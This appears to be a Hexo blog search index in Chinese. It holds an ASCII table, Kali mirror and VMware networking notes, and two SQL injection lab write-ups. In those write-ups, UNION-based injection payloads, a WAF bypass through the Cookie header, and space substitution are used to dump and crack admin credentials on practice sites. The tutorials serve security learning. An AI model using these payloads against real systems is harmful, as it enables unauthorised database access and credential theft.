1010</td><td>052</td><td>42</td><td>0x2A</td><td>*</td><td>星号</td></tr><tr><td>0010 1011</td><td>053</td><td>43</td><td>0x2B</td><td>+</td><td>加号</td></tr><tr><td>0010 1100</td><td>054</td><td>44</td><td>0x2C</td><td>,</td><td>逗号</td></tr><tr><td>0010 1101</td><td>055</td><td>45</td><td>0x2D</td><td>-</td><td>减号/破折号</td></tr><tr><td>0010 1110</td><td>056</td><td>46</td><td>0x2E</td><td>.</td><td>句号</td></tr><tr><td>0010 1111</td><td>057</td><td>47</td><td>0x2F</td><td>/</td><td>斜杠</td></tr><tr><td>0011 0000</td><td>060</td><td>48</td><td>0x30</td><td>0</td><td>字符0</td></tr><tr><td>0011 0001</td><td>061</td><td>49</td><td>0x31</td><td>1</td><td>字符1</td></tr><tr><td>0011 0010</td><td>062</td><td>50</td><td>0x32</td><td>2</td><td>字符2</td></tr><tr><td>0011 0011</td><td>063</td><td>51</td><td>0x33</td><td>3</td><td>字符3</td></tr><tr><td>0011 0100</td><td>064</td><td>52</td><td>0x34</td><td>4</td><td>字符4</td></tr><tr><td>0011 0101</td><td>065</td><td>53</td><td>0x35</td><td>5</td><td>字符5</td></tr><tr><td>0011 0110</td><td>066</td><td>54</td><td>0x36</td><td>6</td><td>字符6</td></tr><tr><td>0011 0111</td><td>067</td><td>55</td><td>0x37</td><td>7</td><td>字符7</td></tr><tr><td>0011 1000</td><td>070</td><td>56</td><td>0x38</td><td>8</td><td>字符8</td></tr><tr><td>0011 1001</td><td>071</td><td>57</td><td>0x39</td><td>9</td><td>字符9</td></tr><tr><td>0011 1010</td><td>072</td><td>58</td><td>0x3A</td><td>:</td><td>冒号</td></tr><tr><td>0011 1011</td><td>073</td><td>59</td><td>0x3B</td><td>;</td><td>分号</td></tr><tr><td>0011 1100</td><td>074</td><td>60</td><td>0x3C</td><td>&lt;</td><td>小于</td></tr><tr><td>0011 1101</td><td>075</td><td>61</td><td>0x3D</td><td>=</td><td>等号</td></tr><tr><td>0011 1110</td><td>076</td><td>62</td><td>0x3E</td><td>&gt;</td><td>大于</td></tr><tr><td>0011 1111</td><td>077</td><td>63</td><td>0x3F</td><td>?</td><td>问号</td></tr><tr><td>0100 0000</td><td>0100</td><td>64</td><td>0x40</td><td>@</td><td>电子邮件符号</td></tr><tr><td>0100 0001</td><td>0101</td><td>65</td><td>0x41</td><td>A</td><td>大写字母A</td></tr><tr><td>0100 0010</td><td>0102</td><td>66</td><td>0x42</td><td>B</td><td>大写字母B</td></tr><tr><td>0100 0011</td><td>0103</td><td>67</td><td>0x43</td><td>C</td><td>大写字母C</td></tr><tr><td>0100 0100</td><td>0104</td><td>68</td><td>0x44</td><td>D</td><td>大写字母D</td></tr><tr><td>0100 0101</td><td>0105</td><td>69</td><td>0x45</td><td>E</td><td>大写字母E</td></tr><tr><td>0100 0110</td><td>0106</td><td>70</td><td>0x46</td><td>F</td><td>大写字母F</td></tr><tr><td>0100 0111</td><td>0107</td><td>71</td><td>0x47</td><td>G</td><td>大写字母G</td></tr><tr><td>0100 1000</td><td>0110</td><td>72</td><td>0x48</td><td>H</td><td>大写字母H</td></tr><tr><td>0100 1001</td><td>0111</td><td>73</td><td>0x49</td><td>I</td><td>大写字母I</td></tr><tr><td>01001010</td><td>0112</td><td>74</td><td>0x4A</td><td>J</td><td>大写字母J</td></tr><tr><td>0100 1011</td><td>0113</td><td>75</td><td>0x4B</td><td>K</td><td>大写字母K</td></tr><tr><td>0100 1100</td><td>0114</td><td>76</td><td>0x4C</td><td>L</td><td>大写字母L</td></tr><tr><td>0100 1101</td><td>0115</td><td>77</td><td>0x4D</td><td>M</td><td>大写字母M</td></tr><tr><td>0100 1110</td><td>0116</td><td>78</td><td>0x4E</td><td>N</td><td>大写字母N</td></tr><tr><td>0100 1111</td><td>0117</td><td>79</td><td>0x4F</td><td>O</td><td>大写字母O</td></tr><tr><td>0101 0000</td><td>0120</td><td>80</td><td>0x50</td><td>P</td><td>大写字母P</td></tr><tr><td>0101 0001</td><td>0121</td><td>81</td><td>0x51</td><td>Q</td><td>大写字母Q</td></tr><tr><td>0101 0010</td><td>0122</td><td>82</td><td>0x52</td><td>R</td><td>大写字母R</td></tr><tr><td>0101 0011</td><td>0123</td><td>83</td><td>0x53</td><td>S</td><td>大写字母S</td></tr><tr><td>0101 0100</td><td>0124</td><td>84</td><td>0x54</td><td>T</td><td>大写字母T</td></tr><tr><td>0101 0101</td><td>0125</td><td>85</td><td>0x55</td><td>U</td><td>大写字母U</td></tr><tr><td>0101 0110</td><td>0126</td><td>86</td><td>0x56</td><td>V</td><td>大写字母V</td></tr><tr><td>0101 0111</td><td>0127</td><td>87</td><td>0x57</td><td>W</td><td>大写字母W</td></tr><tr><td>0101 1000</td><td>0130</td><td>88</td><td>0x58</td><td>X</td><td>大写字母X</td></tr><tr><td>0101 1001</td><td>0131</td><td>89</td><td>0x59</td><td>Y</td><td>大写字母Y</td></tr><tr><td>0101 1010</td><td>0132</td><td>90</td><td>0x5A</td><td>Z</td><td>大写字母Z</td></tr><tr><td>0101 1011</td><td>0133</td><td>91</td><td>0x5B</td><td>[</td><td>开方括号</td></tr><tr><td>0101 1100</td><td>0134</td><td>92</td><td>0x5C</td><td>\</td><td>反斜杠</td></tr><tr><td>0101 1101</td><td>0135</td><td>93</td><td>0x5D</td><td>]</td><td>闭方括号</td></tr><tr><td>0101 1110</td><td>0136</td><td>94</td><td>0x5E</td><td>^</td><td>脱字符</td></tr><tr><td>0101 1111</td><td>0137</td><td>95</td><td>0x5F</td><td>_</td><td>下划线</td></tr><tr><td>0110 0000</td><td>0140</td><td>96</td><td>0x60</td><td>`</td><td>开单引号</td></tr><tr><td>0110 0001</td><td>0141</td><td>97</td><td>0x61</td><td>a</td><td>小写字母a</td></tr><tr><td>0110 0010</td><td>0142</td><td>98</td><td>0x62</td><td>b</td><td>小写字母b</td></tr><tr><td>0110 0011</td><td>0143</td><td>99</td><td>0x63</td><td>c</td><td>小写字母c</td></tr><tr><td>0110 0100</td><td>0144</td><td>100</td><td>0x64</td><td>d</td><td>小写字母d</td></tr><tr><td>0110 0101</td><td>0145</td><td>101</td><td>0x65</td><td>e</td><td>小写字母e</td></tr><tr><td>0110 0110</td><td>0146</td><td>102</td><td>0x66</td><td>f</td><td>小写字母f</td></tr><tr><td>0110 0111</td><td>0147</td><td>103</td><td>0x67</td><td>g</td><td>小写字母g</td></tr><tr><td>0110 1000</td><td>0150</td><td>104</td><td>0x68</td><td>h</td><td>小写字母h</td></tr><tr><td>0110 1001</td><td>0151</td><td>105</td><td>0x69</td><td>i</td><td>小写字母i</td></tr><tr><td>0110 1010</td><td>0152</td><td>106</td><td>0x6A</td><td>j</td><td>小写字母j</td></tr><tr><td>0110 1011</td><td>0153</td><td>107</td><td>0x6B</td><td>k</td><td>小写字母k</td></tr><tr><td>0110 1100</td><td>0154</td><td>108</td><td>0x6C</td><td>l</td><td>小写字母l</td></tr><tr><td>0110 1101</td><td>0155</td><td>109</td><td>0x6D</td><td>m</td><td>小写字母m</td></tr><tr><td>0110 1110</td><td>0156</td><td>110</td><td>0x6E</td><td>n</td><td>小写字母n</td></tr><tr><td>0110 1111</td><td>0157</td><td>111</td><td>0x6F</td><td>o</td><td>小写字母o</td></tr><tr><td>0111 0000</td><td>0160</td><td>112</td><td>0x70</td><td>p</td><td>小写字母p</td></tr><tr><td>0111 0001</td><td>0161</td><td>113</td><td>0x71</td><td>q</td><td>小写字母q</td></tr><tr><td>0111 0010</td><td>0162</td><td>114</td><td>0x72</td><td>r</td><td>小写字母r</td></tr><tr><td>0111 0011</td><td>0163</td><td>115</td><td>0x73</td><td>s</td><td>小写字母s</td></tr><tr><td>0111 0100</td><td>0164</td><td>116</td><td>0x74</td><td>t</td><td>小写字母t</td></tr><tr><td>0111 0101</td><td>0165</td><td>117</td><td>0x75</td><td>u</td><td>小写字母u</td></tr><tr><td>0111 0110</td><td>0166</td><td>118</td><td>0x76</td><td>v</td><td>小写字母v</td></tr><tr><td>0111 0111</td><td>0167</td><td>119</td><td>0x77</td><td>w</td><td>小写字母w</td></tr><tr><td>0111 1000</td><td>0170</td><td>120</td><td>0x78</td><td>x</td><td>小写字母x</td></tr><tr><td>0111 1001</td><td>0171</td><td>121</td><td>0x79</td><td>y</td><td>小写字母y</td></tr><tr><td>0111 1010</td><td>0172</td><td>122</td><td>0x7A</td><td>z</td><td>小写字母z</td></tr><tr><td>0111 1011</td><td>0173</td><td>123</td><td>0x7B</td><td>{</td><td>开花括号</td></tr><tr><td>0111 1100</td><td>0174</td><td>124</td><td>0x7C</td><td>|</td><td>垂线</td></tr><tr><td>0111 1101</td><td>0175</td><td>125</td><td>0x7D</td><td>}</td><td>闭花括号</td></tr><tr><td>0111 1110</td><td>0176</td><td>126</td><td>0x7E</td><td>~</td><td>波浪号</td></tr><tr><td>0111 1111</td><td>0177</td><td>127</td><td>0x7F</td><td>DEL (delete)</td><td>删除</td></tr></tbody></table><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 编码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASCII </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali更新修改源</title>
      <link href="/posts/58681/"/>
      <url>/posts/58681/</url>
      
        <content type="html"><![CDATA[<h1 id="kali修改更新源和更新命令"><a href="#kali修改更新源和更新命令" class="headerlink" title="kali修改更新源和更新命令"></a>kali修改更新源和更新命令</h1><h2 id="1、修改sources-list源文件"><a href="#1、修改sources-list源文件" class="headerlink" title="1、修改sources.list源文件"></a>1、修改sources.list源文件</h2><pre class="language-none"><code class="language-none">sudo vim /etc/apt/sources.list</code></pre><pre class="language-none"><code class="language-none">#aliyun 阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib# ustc 中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free#deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free# kali 官方源deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib # 默认的，可以注释掉不用管#deb http://security.kali.org/kali-security kali-rolling/updates main contrib non-free#deb-src http://security.kali.org/kali-security kali-rolling/updates main contrib non-free</code></pre><h2 id="2、更新一下源"><a href="#2、更新一下源" class="headerlink" title="2、更新一下源"></a>2、更新一下源</h2><pre class="language-none"><code class="language-none">sudo apt-get update</code></pre><h2 id="3、更新软件"><a href="#3、更新软件" class="headerlink" title="3、更新软件"></a>3、更新软件</h2><pre class="language-none"><code class="language-none">sudo apt-get upgrade</code></pre><h2 id="4、更新系统"><a href="#4、更新系统" class="headerlink" title="4、更新系统"></a>4、更新系统</h2><pre class="language-none"><code class="language-none">sudo apt-get dist-upgrade</code></pre><h2 id="5、清理安装包"><a href="#5、清理安装包" class="headerlink" title="5、清理安装包"></a>5、清理安装包</h2><pre class="language-none"><code class="language-none">sudo apt-get cleansudo apt-get autoclean</code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 疑难杂症 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机联网</title>
      <link href="/posts/35439/"/>
      <url>/posts/35439/</url>
      
        <content type="html"><![CDATA[<h1 id="VMware虚拟机NAT模式和桥接模式联网"><a href="#VMware虚拟机NAT模式和桥接模式联网" class="headerlink" title="VMware虚拟机NAT模式和桥接模式联网"></a>VMware虚拟机NAT模式和桥接模式联网</h1><h2 id="一、kali-linux网络操作基本命令"><a href="#一、kali-linux网络操作基本命令" class="headerlink" title="一、kali linux网络操作基本命令"></a>一、kali linux网络操作基本命令</h2><pre class="language-none"><code class="language-none">- sudo ifconfig eth0 down/up --关闭/打开虚拟机虚拟网卡eth0- sudo systemctl restart networking --重启网络服务- sudo /etc/init.d/networking restart --重启网络服务- sudo vim /etc/resolv.conf --配置DNS- sudo vim /etc/network/interfaces --配置网卡、ip地址、子网掩码、网关- :w !sudo tee % --强制保存只读文件</code></pre><h2 id="二、桥接模式下服务配置联网"><a href="#二、桥接模式下服务配置联网" class="headerlink" title="二、桥接模式下服务配置联网"></a>二、桥接模式下服务配置联网</h2><h3 id="1、DNS配置"><a href="#1、DNS配置" class="headerlink" title="1、DNS配置"></a>1、DNS配置</h3><p>桥接模式下虚拟机与物理机共处同一个网段，相当于在物理机局域网网段新增另一个物理机。虚拟机和物理机及其同一网段的所有主机可以互相通信。配置文件写法：</p><pre class="language-none"><code class="language-none">search Home --固定写法nameserver 192.168.1.1 -- 物理机局域网网段网关</code></pre><h3 id="2、网卡配置"><a href="#2、网卡配置" class="headerlink" title="2、网卡配置"></a>2、网卡配置</h3><p>默认有两个网卡“lo”和“eth0”。lo网卡已经默认配置为：</p><pre class="language-none"><code class="language-none">auto loiface lo inet loopback</code></pre><p>配置eth0网卡：</p><pre class="language-none"><code class="language-none">auto eth0 --固定写法iface eth0 inet static --配置静态ipaddress 192.168.1.27 --配置ip（与物理机在同一网段）netmask 255.255.255.0 --配置子网掩码（与物理机一致）gateway 192.168.1.1 --配置网关（与物理机一致）</code></pre><h2 id="三、NAT模式下服务配置联网"><a href="#三、NAT模式下服务配置联网" class="headerlink" title="三、NAT模式下服务配置联网"></a>三、NAT模式下服务配置联网</h2><h3 id="1、DNS配置-1"><a href="#1、DNS配置-1" class="headerlink" title="1、DNS配置"></a>1、DNS配置</h3><p>NAT模式下虚拟机可以通过物理机作为代理与互联网通信，虚拟机可以ping通物理机，但是物理机无法ping通虚拟机，物理机与虚拟机不在同一网段。自定义虚拟机网段需要去VMware虚拟网络编辑器中改变网段ip，在DNS配置文件中修改无效。配置文件写法：</p><pre class="language-none"><code class="language-none">search localdomain --固定写法nameserver 192.168.192.2 --虚拟网络编辑器中的网段网关（虚拟机默认网关为"XXX.XXX.XXX.2" 物理机默认网关为"XXX.XXX.XX.1"）</code></pre><h3 id="2、网卡配置-1"><a href="#2、网卡配置-1" class="headerlink" title="2、网卡配置"></a>2、网卡配置</h3><p>默认不写！如果强制配置静态ip需要现把虚拟网络编辑器中的网段修改。所有配置完之后重启网络服务再检查连接。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 疑难杂症 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>遇到阻难绕过WAF过滤</title>
      <link href="/posts/35794/"/>
      <url>/posts/35794/</url>
      
        <content type="html"><![CDATA[<h3 id="第一步：分析判断是否存在SQL注入"><a href="#第一步：分析判断是否存在SQL注入" class="headerlink" title="第一步：分析判断是否存在SQL注入"></a>第一步：分析判断是否存在SQL注入</h3><p>首先进来是个新闻页面我们点击一条新闻来与数据库进行交互</p><p><img src="/posts/35794/1.png"></p><p>URL通过GET传参可能存在SQL注入</p><p><img src="/posts/35794/2.png"></p><p>我们修改id的值170发现跳转到了不同的页面，说明存在SQL注入漏洞。</p><p><img src="/posts/35794/3.png"></p><h3 id="第二步：判断字段数"><a href="#第二步：判断字段数" class="headerlink" title="第二步：判断字段数"></a>第二步：判断字段数</h3><p>此时输入语句: <strong>?id=171 order by 10</strong>来判断字段数，页面正常显示。</p><p><img src="/posts/35794/4.png"></p><p>增大字段数输入语句: <strong>?id=171 order by 11</strong>测试，页面报错，说明数据库字段数为10。</p><p><img src="/posts/35794/5.png"></p><h3 id="第三步：判断回显点"><a href="#第三步：判断回显点" class="headerlink" title="第三步：判断回显点"></a>第三步：判断回显点</h3><p>我们继续尝试输入语句: <strong>?id=171 union select  1,2,3,4,5,6,7,8,9,10 from admin</strong>来猜测是否存在admin表并且测试回显点。</p><p><img src="/posts/35794/6.png"></p><p>我们发现网页存在注入防护，携带select等敏感词的语句都会被拦截。因为网页防护一般只拦截GET、POST传参，我们尝试将测试语句放到cookie里面发送给服务器，这里利用到了ModHeader插件。首先点击“+”号新增一个Request头，添加一个Cookie头，并设置id=171，并打钩确保已开启。</p><p><img src="/posts/35794/7.png"></p><p>我们直接访问不携带id参数的网址：<a href="http://kypt8004.ia.aqlab.cn/shownews.asp%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%EF%BC%8C%E8%AF%B4%E6%98%8ECookie%E9%87%8C%E7%9A%84id=171%E8%83%BD%E5%A4%9F%E6%AD%A3%E5%B8%B8%E4%BC%A0%E5%8F%82%EF%BC%8C%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BD%93%E5%81%9ASQL%E8%AF%AD%E5%8F%A5%E6%8B%BC%E6%8E%A5%E3%80%82">http://kypt8004.ia.aqlab.cn/shownews.asp，页面正常显示，说明Cookie里的id=171能够正常传参，被服务器当做SQL语句拼接。</a></p><p><img src="/posts/35794/8.png"></p><p>我们尝试直接将ModHeader中Cookie的值改为: <strong>id=171 union select 1,2,3,4,5,6,7,8,9,10 from admin</strong>进行传参，发现依然出现数据库返回错误的页面。</p><p><img src="/posts/35794/9.png"></p><p>说明网页可能对拼接的SQL语句中的空格符号进行了过滤，我们尝试用特殊符号“+”或者“%0a”来代替空格，发现页面正常并且回显了“2、3、7、8、9”，这说明数据库中存在admin表并且回显点为“2、3、7、8、9”。</p><p><img src="/posts/35794/10.png"></p><h3 id="第四部：查询数据库信息"><a href="#第四部：查询数据库信息" class="headerlink" title="第四部：查询数据库信息"></a>第四部：查询数据库信息</h3><p>接下来尝试猜测admin表中常见的字段名“username”、“password”，在回显点中任选两个分别填入username和password 语句: <strong>id=171+union+select+1,username,password,4,5,6,7,8,9,10+from+admin</strong>。刷新页面发现2,3回显点返回了username和password的值：admin和b9a2a2b5dffb918c。</p><p><img src="/posts/35794/11.png"></p><p><img src="/posts/35794/12.png"></p><p>密码是由字母+数字的16位组合，很符合md5的特征，于是我们打开cmd5.com进行解密，密码明文为welcome。</p><p><img src="/posts/35794/13.png"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为了女神小芳</title>
      <link href="/posts/17209/"/>
      <url>/posts/17209/</url>
      
        <content type="html"><![CDATA[<h2 id="第一步：判断是否存在SQL注入漏洞"><a href="#第一步：判断是否存在SQL注入漏洞" class="headerlink" title="第一步：判断是否存在SQL注入漏洞"></a>第一步：判断是否存在SQL注入漏洞</h2><p>首先根据网页URL可以判断网页通过GET请求提交数据，我们可以构造语句判断是否存在SQL注入漏洞。</p><p><img src="/posts/17209/1.png"></p><p>构造语句: <strong>?id=1 and 1=1</strong> 页面返回正常。</p><p>构造语句: <strong>?id=1 and 1=2</strong> 页面返回不正常。</p><p>说明我们输入的语句被提交到后端执行了，初步判断这里可能存在一个注入漏洞。</p><p><img src="/posts/17209/2.png"></p><p><img src="/posts/17209/3.png"></p><h2 id="第二步：判断字段数"><a href="#第二步：判断字段数" class="headerlink" title="第二步：判断字段数"></a>第二步：判断字段数</h2><p>构造语句: <strong>?id=1 and 1=1 order by 1</strong> 页面显示正常。</p><p>构造语句: <strong>?id=1 and 1=1 order by 2</strong> 页面显示正常。</p><p>构造语句: <strong>?id=1 and 1=1 order by 3</strong> 页面返回错误，由此判断字段数为 <strong>2</strong>。</p><p><img src="/posts/17209/4.png"></p><p><img src="/posts/17209/5.png"></p><p><img src="/posts/17209/6.png"></p><p><strong>order by</strong>关键字用于对结果集按照一个列或者多个列进行排序，默认按照升序对表中的记录进行排序，可以使用<strong>DESC</strong>关键字使之按照降序排序。</p><p>在SQL注入中我们可以通过order by关键字来判断表中的字段数量，如果order by后面接的不是字段值而是数字，那么这个<strong>数字代表的就是用表中第几个字段进行排序</strong>，比如<strong>order by 4</strong>就表示用表中第四个字段进行排序。我们在order by 3 的时候页面报错说明order by排序的结果集中不存在第三个字段，故说明表中有两个字段。</p><h2 id="第三步：判断回显点"><a href="#第三步：判断回显点" class="headerlink" title="第三步：判断回显点"></a>第三步：判断回显点</h2><p>构造语句: <strong>?id=1 and 1=2 union select 1,2</strong>页面出现了2，说明在数字2是一个回显点，可以用于回显我们想要得到的数据信息。</p><p><img src="/posts/17209/7.png"></p><p>这里<strong>and 1=2</strong>恒为false用于把前面的id=1获取的信息屏蔽，只显示后面union select的结果。</p><h2 id="第四步：查询信息"><a href="#第四步：查询信息" class="headerlink" title="第四步：查询信息"></a>第四步：查询信息</h2><p>information_schema数据库和performance_schema数据库都是MySQL自带的信息数据库，其中performance_schema用于数据库性能分析，而information_schema数据库用于存储数据库元数据（关于数据的数据），例如数据库名、表名、列的数据类型、访问权限等。information_schema中的表实际上是视图，而不是基本表，因此文件系统上没有与之相关的文件。</p><h4 id="information-schema库中常用的表："><a href="#information-schema库中常用的表：" class="headerlink" title="information_schema库中常用的表："></a>information_schema库中常用的表：</h4><h5 id="SCHEMATA表："><a href="#SCHEMATA表：" class="headerlink" title="SCHEMATA表："></a>SCHEMATA表：</h5><p>存储当前MySQL实例中所有数据库信息。show databases命令就是从这个表获取数据库信息。</p><p><strong>SCHEMA_NAME</strong>字段存储数据库名。</p><h5 id="TABLES表："><a href="#TABLES表：" class="headerlink" title="TABLES表："></a>TABLES表：</h5><p>存储数据库中的所有表信息（包括视图）。show tables from x命令就是从这个表中获取信息。</p><p><strong>TABLE_NAME</strong>字段存储表名。</p><p><strong>TABLE_SCHEMA</strong>字段存储表隶属的数据库名。</p><h5 id="COLUMNS表"><a href="#COLUMNS表" class="headerlink" title="COLUMNS表"></a>COLUMNS表</h5><p>存储表中的列信息。show columns from schemaname.tablename命令就是从这个表查询。</p><p><strong>COLUMN_NAME</strong>字段存储列名。</p><p><strong>TABLE_NAME</strong>字段存储列隶属的表名。</p><p><strong>TABLE_SCHEMA</strong>字段存储字段隶属的库名。</p><p>构造语句: **?id=1 and 1=2 union select 1,database()**查询数据库名。</p><p><img src="/posts/17209/8.png"></p><p><img src="/posts/17209/9.png"></p><p>构造语句: **?id=1 and 1=2 union select 1,version()**查询当前数据库版本。</p><p><img src="/posts/17209/10.png"></p><p>构造语句: <strong>?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1</strong>查询当前数据库表名，并且只显示第一行。</p><p><img src="/posts/17209/11.png"></p><p>limit子句可以被用于强制select语句返回指定的记录数。limit接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，就是从第几行开始返回；第二个参数指定返回记录行的最大行数，就是返回多少行。如果只有一个参数，默认偏移量为0，参数指定返回的最大记录数。初始记录行的默认偏移量为0而不是1。</p><p>构造语语句: <strong>?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=‘admin’ limit 0,1</strong>查询当前数据库中admin表的第一个字段名。</p><p><img src="/posts/17209/12.png"></p><p>构造语句: <strong>?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=‘admin’ limit 1,1</strong>查询当前数据库中admin表的第二个字段名。</p><p><img src="/posts/17209/13.png"></p><p>构造语句: <strong>?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=‘admin’ limit 2,1</strong>查询当前数据库中admin表的第三个字段名。</p><p><img src="/posts/17209/14.png"></p><p>构造语句: <strong>?id=1 and 1=2 union select 1,username from admin limit 0,1</strong>查询admin表username列的第一个字段内容。</p><p><img src="/posts/17209/15.png"></p><p>构造语句: <strong>?id=1 and 1=2 union select 1,password from admin limit 0,1</strong>查询admin表password列的第一个字段内容。</p><p><img src="/posts/17209/16.png"></p><p>最后get到了管理员的账号密码。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
